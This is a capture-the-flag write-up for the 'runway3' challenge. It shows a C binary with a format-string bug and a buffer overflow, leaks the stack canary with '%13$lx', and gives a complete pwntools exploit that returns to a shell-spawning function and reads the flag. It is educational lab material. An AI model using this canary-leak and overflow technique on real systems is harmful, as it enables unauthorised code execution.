# runway3

This challenge provided the following `runway3.c` file:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/sendfile.h>

int win() {
    printf("You win! Here is your shell:\n");
    fflush(stdout);

    system("/bin/sh");
}

int echo(int amount) {
    char message[32];

    fgets(message, amount, stdin);

    printf(message);
    fflush(stdout);
}

int main() {
    printf("Is it just me, or is there an echo in here?\n");
    fflush(stdout);

    echo(31);
    echo(100);

    return 0;
}
```

If the makefile were the same as `runway1` and `runway2`, this would be very straightforward: we could
simply ignore the first call to `echo` and then overflow on the second one. Unfortunately, this is the
`Makefile`:

```makefile
all: runway3.c
        gcc runway3.c -o runway3 -no-pie
```

This means that we have a canary to worry about. Luckily, we can make use of the fact that our input is
output with the `printf` command to determine the canary.

Since our input is passed directly into `printf`, we can include format specifiers. The first goal is to
find the canary. To recognize the canary, the same output should change the ouput wildly. This takes some
playing around with the inputs, but to print something on the stack it should be at least the 7th input
since there are 6 input registers (this is a 64-bit binary). To print 8 bytes of the nth argument in c, you
can use `%n$lx`. For example, `%7$lx` will print 8 bytes in hex of the 7th argument.


After some time, I found that the canary was the 13th argument, as can be seen from this output:

```
# ./runway3
Is it just me, or is there an echo in here?
%13$lx
36b628fc38e53b00


# ./runway3
Is it just me, or is there an echo in here?
%13$lx
237cd9552505f200


# ./runway3
Is it just me, or is there an echo in here?
%13$lx
970cb7dbb0ed0700


# ./runway3
Is it just me, or is there an echo in here?
%13$lx
1da9d5099c136800
```

The next goal was to find the stack location of the return address, which I found to be the 15th argument.
(It generally should be 2 after the canary).

For this exploit, I happened to also need a `ret` gadget. (The location of any point in the executable where
`ret` is called). To do this, I just used `objdump -d runway3` then searched for `ret`.

Beyond that, my exploit was quite similar to `runway1`:

```python
import pwn

pwn.context.binary = elf = pwn.ELF("./runway3")

if pwn.args.REMOTE:
    io = pwn.remote("challs.pwnoh.io",13403)
else:
    io = pwn.process("./runway3")

io.recvuntil(b'echo in here?\n')
io.sendline(b'%13$lx %15$lx') # canary position, return to

canary_ret = io.recvline().split()

canary = int(canary_ret[0], 16)
leaked_ret = int(canary_ret[1], 16)

ret_gadget = 0x40101a

canary_off = 40
payload = b'A' * canary_off + \
        canary.to_bytes(8, 'little') + \
        (0).to_bytes(8, 'little') + \
        ret_gadget.to_bytes(8, 'little') + \
        elf.symbols['win'].to_bytes(8, 'little')

io.sendline(payload)

io.interactive()
```

Which gives this:
```
# python3 exploit.py REMOTE SILENT
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYou win! Here is your shell:
$ ls
flag.txt
run
$ cat flag.txt
bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}
```

Giving the flag `bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}`
